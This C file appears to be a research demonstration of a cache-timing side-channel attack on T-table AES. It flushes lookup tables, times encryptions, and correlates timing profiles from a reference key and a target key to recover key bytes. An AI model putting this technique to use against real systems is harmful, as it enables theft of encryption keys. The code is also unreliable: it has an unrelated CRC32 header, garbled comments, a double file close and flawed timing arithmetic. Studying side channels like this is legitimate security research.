/**************
CRC32 model:
Name     : "CRC32"
Width    : 32
Poly     : 04C11DB7
Init     : FFFFFFFF
RefIn    : True
RefOut   : True
Check    : CBF43926
**************/
/******************************Test*******************************/
#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include "aes.h"
#include "aes_locl.h"
#include"cacheutils.h"


unsigned char readykey[17] = {0x02, 0x76, 0x15, 0x48, 0x20, 0x40, 0xE3, 0x27, 0x22, 0xD8, 0x48, 0xAD, 0x23, 0xD8, 0x48, 0x2D, 0};
unsigned char userstrkey[17] = {0xfc, 0x76, 0x15, 0x48, 0x20, 0x40, 0xE3, 0x27, 0x22, 0xD8, 0x48, 0xAD, 0x23, 0xD8, 0x48, 0x2D, 0};
unsigned char DataBuf[17] = {0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0};

// ready reserch
double t[16][256];			  //total time
double tsq[16][256];		  //total deviation
long long tnum[16][256];	  //total encrypt times
double u[16][256];			  // average time
double udev[16][256];		  //average deviation
double cha[16][256];		  //u-average
double chadeviation[16][256]; //udev[j][b] / sqrt(tnum[j][b])

// attack reserch
double t2[16][256];			   //total time
double tsq2[16][256];		   //total deviation
long long tnum2[16][256];	   //total encrypt times
double u2[16][256];			   // average time
double udev2[16][256];		   //average deviation
double cha2[16][256];		   //u-average
double chadeviation2[16][256]; //udev[j][b] / sqrt(tnum[j][b])

double packets = 0; //readyresearch
double ttotal = 0;
double packets2 = 0; //attackresearch
double ttotal2 = 0;

int loopnum=0;


FILE *fpWrite;

struct timespec time_start = {0, 0}, time_end = {0, 0};

struct timespec time_start1 = {0, 0}, time_end1 = {0, 0};
/************************ready*********************************/
void tally(double timing) //record time
{
	int j;
	int b;
	for (j = 0; j < 16; ++j)
	{
		b = 255 & (int)DataBuf[j];
		++packets;
		ttotal += timing;
		t[j][b] += timing;
		tsq[j][b] += timing * timing;
		tnum[j][b] += 1;
	}
}

void countudev(void) //count average deviation
{
	int j;
	int b;


	double taverage;
	taverage = ttotal / packets;
	printf("avg:%f\n", taverage);
	for (j = 0; j < 16; ++j)
		for (b = 0; b < 256; ++b)
		{
			u[j][b] = t[j][b] / tnum[j][b];
			udev[j][b] = tsq[j][b] / tnum[j][b];
			udev[j][b] -= u[j][b] * u[j][b];
			udev[j][b] = sqrt(udev[j][b]);
		}
	for (j = 0; j < 16; ++j)
		for (b = 0; b < 256; ++b)
		{
			cha[j][b] = u[j][b] - taverage;
			chadeviation[j][b] = udev[j][b] / sqrt(tnum[j][b]);
		}
}

void readyreserch()
{
	uint64_t start, diff;
	AES_KEY key;
	AES_set_encrypt_key((unsigned char *)readykey, 128, &key);
	srand((unsigned)time(NULL)); //��ʱ���ʼ�����������
	unsigned char cipher1[16] = {0}; 
	for (int j = 0; j < loopnum; j++)
	{ //encrypt times
		for (int i = 0; i < 16; i++)
		{
			DataBuf[i] = rand(); //�������������
		}
		
		for (int i = 0; i < 256; i++)
		{
			flush(Te0 + i);
			flush(Te1 + i);
			flush(Te2 + i);
			flush(Te3 + i);
		}

		//start = rdtsc();
		clock_gettime(CLOCK_REALTIME, &time_start);

		AES_encrypt((unsigned char *)DataBuf, cipher1, &key); //����

		clock_gettime(CLOCK_REALTIME, &time_end);

		//printf("duration:%lds %ldns  and ", time_end.tv_sec-time_start.tv_sec,time_end.tv_nsec-time_start.tv_nsec);

		int time1 = time_end.tv_nsec - time_start.tv_nsec;

		//start = (rdtsc() - start);

		if (time1 > 200 && time1 < 1000) //500
		{
			//printf("crash: %d \n",start);
			tally((double)time1);  // �洢ʱ��

			printf("time1: %f \n", (double)time1);
		}
	}
	countudev();
}

/************************attack*********************************/
void tally2(double timing) //record time
{
	int j;
	int b;
	for (j = 0; j < 16; ++j)
	{
		b = 255 & (int)DataBuf[j];
		++packets2;
		ttotal2 += timing;
		t2[j][b] += timing;
		tsq2[j][b] += timing * timing;
		tnum2[j][b] += 1;
	}
}

void countudev2(void) //count average deviation
{
	int j;
	int b;
	double taverage;
	taverage = ttotal2 / packets2;
	printf("avg:%f\n", taverage);
	for (j = 0; j < 16; ++j)
		for (b = 0; b < 256; ++b)
		{
			u2[j][b] = t2[j][b] / tnum2[j][b];
			udev2[j][b] = tsq2[j][b] / tnum2[j][b];
			udev2[j][b] -= u2[j][b] * u2[j][b];
			udev2[j][b] = sqrt(udev2[j][b]);
		}
	for (j = 0; j < 16; ++j)
		for (b = 0; b < 256; ++b)
		{
			cha2[j][b] = u2[j][b] - taverage;
			chadeviation2[j][b] = udev2[j][b] / sqrt(tnum2[j][b]);
		}
}

void attackreserch()
{
	uint64_t start, diff;
	AES_KEY key;
	AES_set_encrypt_key((unsigned char *)userstrkey, 128, &key);
	unsigned char cipher1[16] = {0};
	srand((unsigned)time(NULL));
	for (int j = 0; j < loopnum; j++)
	{ //encrypt times 1000000
		for (int i = 0; i < 16; i++)
		{
			DataBuf[i] = rand();
		}
		for (int i = 0; i < 256; i++)
		{
			flush(Te0 + i);
			flush(Te1 + i);
			flush(Te2 + i);
			flush(Te3 + i);
		}
		
		//start = rdtsc();

		clock_gettime(CLOCK_REALTIME, &time_start1);

		AES_encrypt((unsigned char *)DataBuf, cipher1, &key);

		clock_gettime(CLOCK_REALTIME, &time_end1);
		int time2 = time_end1.tv_nsec - time_start1.tv_nsec;
		//start = (rdtsc() - start);
		if (time2 > 200 && time2 < 1000)
			tally2((double)time2);
		printf("time2: %f \n", (double)time2);
	}
	countudev2();
}

/************************analyse*********************************/
double c[256];
double v[256];
int cpos[256];
int cposcmp(const void *v1, const void *v2)
{
	int *i1 = (int *)v1;
	int *i2 = (int *)v2;
	if (c[255 & *i1] < c[255 & *i2])
		return 1;
	if (c[255 & *i1] > c[255 & *i2])
		return -1;
	return 0;
}
void processdata(void)
{
	int b;
	int i;
	int j;
	int numok;
	double z;
	for (b = 0; b < 16; ++b)
	{
		for (i = 0; i < 256; ++i)
		{
			c[i] = v[i] = 0;
			cpos[i] = i;
			for (j = 0; j < 256; ++j)
			{
				c[i] += cha[b][j] * cha2[b][i ^ j];
				z = chadeviation[b][j] * cha2[b][i ^ j];
				v[i] += z * z;
				z = cha[b][j] * chadeviation2[b][i ^ j];
				v[i] += z * z;
			}
		}
		qsort(cpos, 256, sizeof(int), cposcmp);
		numok = 0;
		for (i = 0; i < 256; ++i)
			if (c[cpos[0]] - c[cpos[i]] < 10 * sqrt(v[cpos[i]]))
				++numok;
		//printf("%3d %2d", numok, b);
		for (i = 0; i < 256; ++i)
			if (c[cpos[0]] - c[cpos[i]] < 10 * sqrt(v[cpos[i]]))
				//printf(" %02x", cpos[i] ^ readykey[b]);
		printf("\n");
	}
}
void find()
{
	for (int i = 0; i < 16; i++)
	{
		double max = cha[i][0];
		int maxn = 0;
		for (int j = 1; j < 256; j++)
		{
			if (cha[i][j] > max)
			{
				max = cha[i][j];
				maxn = j;
			}
		}
		fprintf(fpWrite, "%d ", maxn);
		fprintf(fpWrite, "%lf ", max);
	}
	fclose(fpWrite);
}
void find2()
{
	for (int i = 0; i < 16; i++)
	{
		double max = cha2[i][0];
		int maxn = 0;
		for (int j = 1; j < 256; j++)
		{
			if (cha2[i][j] > max)
			{
				max = cha2[i][j];
				maxn = j;
			}
		}
		fprintf(fpWrite, "%d ", maxn);
		fprintf(fpWrite, "%lf ", max);
	}
	fclose(fpWrite);
}
int main(int argc,char *argv[])
{


     for(int i=0;i<16;i++)
    {
      int kl=atoi(argv[i+1]);
      readykey[i]=kl;
      userstrkey[i]=kl;
     // printf("%x,",readykey[i]);
    }
    loopnum=atoi(argv[17]);
  
	printf("ready\n");
	readyreserch();
	
	fpWrite = fopen("ready.txt", "w");
	for (int i = 0; i < 16; i++)
	{
		if (fpWrite == NULL)
		{
			return 0;
		}
		for (int j = 0; j < 256; j++)
			fprintf(fpWrite, "%lf ", cha[i][j]);
		for (int j = 0; j < 256; j++)
			fprintf(fpWrite, "%lf ", chadeviation[i][j]);
	}
	fclose(fpWrite);


	fpWrite = fopen("readyresult.txt", "w");
	fprintf(fpWrite, "%lf ", ttotal / packets);
	find();
	fclose(fpWrite);
	printf("attack\n");
	attackreserch();
	fpWrite = fopen("attack.txt", "w");
	for (int i = 0; i < 16; i++)
	{
		if (fpWrite == NULL)
		{
			return 0;
		}
		for (int j = 0; j < 256; j++)
			fprintf(fpWrite, "%lf ", cha2[i][j]);
		for (int j = 0; j < 256; j++)
			fprintf(fpWrite, "%lf ", chadeviation2[i][j]);
	}
	fclose(fpWrite);
	fpWrite = fopen("attackresult.txt", "w");
	fprintf(fpWrite, "%lf ", ttotal2 / packets2);
	find2();
	fclose(fpWrite);
	printf("process\n");
	processdata();
	/*
	for(int i=0;i<256;i++)
		printf("%f\n",cha[0][i]);
	printf("\n\n\n");
	for(int i=0;i<256;i++)
		printf("%f\n",cha2[0][i]);
	*/

	return 0;
}

/************************End************************************/
